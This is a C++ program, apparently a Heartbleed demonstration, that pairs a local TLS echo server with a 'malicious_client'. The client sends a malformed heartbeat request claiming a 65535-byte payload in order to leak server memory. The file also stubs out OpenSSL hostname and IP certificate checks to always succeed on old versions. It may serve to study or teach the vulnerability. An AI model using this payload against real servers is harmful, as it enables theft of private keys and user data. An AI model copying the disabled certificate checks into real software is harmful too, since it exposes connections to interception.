// For old openssl version.
#include <openssl/ssl.h>
#if OPENSSL_VERSION_NUMBER <= 0x10100000L
    #define X509_check_ip_asc(...) true
    #define X509_check_host(...)   true
#endif

#include <print>
#include <boost/asio.hpp>
#include <boost/asio/ssl.hpp>
#include <stdexec/execution.hpp>
#include <asioexec/interface.hpp>
using namespace boost::asio;
using namespace stdexec;
using namespace asioexec;

auto bad_heartbeat = std::string { 
    0x18,                  // Content Type: Heartbeat
    0x03, 0x02,            // TLS 1.1
    0x01,                  // Heartbeat Request
    char(0xff), char(0xff) // Payload Length = 65535
};

void ssl_operation ( auto status )
{
    auto buf = std::string(1024, '\0');

    if ( status <= 0 )
        throw std::runtime_error(ERR_error_string(ERR_get_error(), buf.data()));
}

std::execution::sender auto echo_server
    = just(/*stream=*/  ssl::stream<ip::tcp::socket>(system_executor(), asioexec::tls_context), 
           /*listener=*/ip::tcp::acceptor(system_executor(), ip::tcp::endpoint(ip::make_address("127.0.0.1"), 12345)),
           /*buff=*/    std::string(65536, '\0'))
    | let_value([] (auto&& stream, auto&& listener, auto&& buff)
        {
            return just()
                 | then     ([&] { std::println("[server]: starts on thread {}", std::this_thread::get_id()); })

                 | let_value([&] { return listener.async_accept(stream.next_layer(), use_sender); })
                 | then     ([&] { std::println("[server]: tcp connected (with local = {}, remote = {})", make_formattable(stream.next_layer().local_endpoint()), make_formattable(stream.next_layer().remote_endpoint())); })

                 | then     ([&] { ssl_operation(SSL_set_tlsext_heartbeat_no_requests(stream.native_handle(), SSL_TLSEXT_HB_ENABLED)); })
                 | then     ([&] { std::println("[server]: enable heartbeat"); })

                 | let_value([&] { return stream.async_handshake(ssl::stream_base::server, use_sender); })
                 | then     ([&] { std::println("[server]: ssl/tls handshake ok"); })

                 | let_value([&] { return stream.async_read_some(buffer(buff), use_sender); })
                 | then     ([&] (int bytes) { std::println("[server]: received request: {}", buff); buff = "world!"; })

                 | let_value([&] { return stream.async_write_some(buffer(buff), use_sender); })
                 | then     ([&] (int bytes) { std::println("[server]: sent response: {}", buff); buff.resize(65536); })


                 | let_value([&] { return stream.async_read_some(buffer(buff), use_sender); })
                 | then     ([&] (int bytes) { std::println("[server]: received request: {}", buff); buff = "world!"; })

                 | let_value([&] { return stream.async_write_some(buffer(buff), use_sender); })
                 | then     ([&] (int bytes) { std::println("[server]: sent response: {}", buff); buff.resize(65536); });
        });

std::execution::sender auto malicious_client 
    = just(/*stream=*/ssl::stream<ip::tcp::socket>(system_executor(), asioexec::tls_context),
           /*buff=*/  std::string("hello!"))
    | let_value([] (auto&& stream, auto&& buff)
        {
            return just()
                 | then     ([&] { std::println("[client]: starts on thread {}", std::this_thread::get_id()); })

                 | let_value([&] { return stream.next_layer().async_connect(ip::tcp::endpoint(ip::make_address("127.0.0.1"), 12345), use_sender); })
                 | then     ([&] { std::println("[client]: tcp connected (with local = {}, remote = {})", make_formattable(stream.next_layer().local_endpoint()), make_formattable(stream.next_layer().remote_endpoint())); })

                 | then     ([&] { ssl_operation(SSL_set_tlsext_heartbeat_no_requests(stream.native_handle(), SSL_TLSEXT_HB_ENABLED)); })
                 | then     ([&] { std::println("[client]: enable heartbeat"); })

                 | let_value([&] { return stream.async_handshake(ssl::stream_base::client, use_sender); })
                 | then     ([&] { std::println("[client]: ssl/tls handshake ok"); })

                 | let_value([&] { return stream.async_write_some(buffer(buff), use_sender); })
                 | then     ([&] (int bytes) { std::println("[client]: sent request: {}", buff); })

                 | let_value([&] { return stream.async_read_some(buffer(buff), use_sender); })
                 | then     ([&] (int bytes) { std::println("[client]: received response: {}", buff); buff.resize(bytes); })

                 | then     ([&] { ssl_operation(SSL_write(stream.native_handle(), bad_heartbeat.c_str(), bad_heartbeat.size())); })
                 | then     ([&] { std::println("[client]: send heartbeat"); })

                 | let_value([&] { return stream.async_read_some(buffer(buff), use_sender); })
                 | then     ([&] (int bytes) { std::println("[client]: received heartbeat response: {}", buff); buff.resize(bytes); });
        });

int main ( )
{
    sync_wait(std::move(echo_server));
    // sync_wait(when_all(std::move(echo_server), std::move(malicious_client)));
}




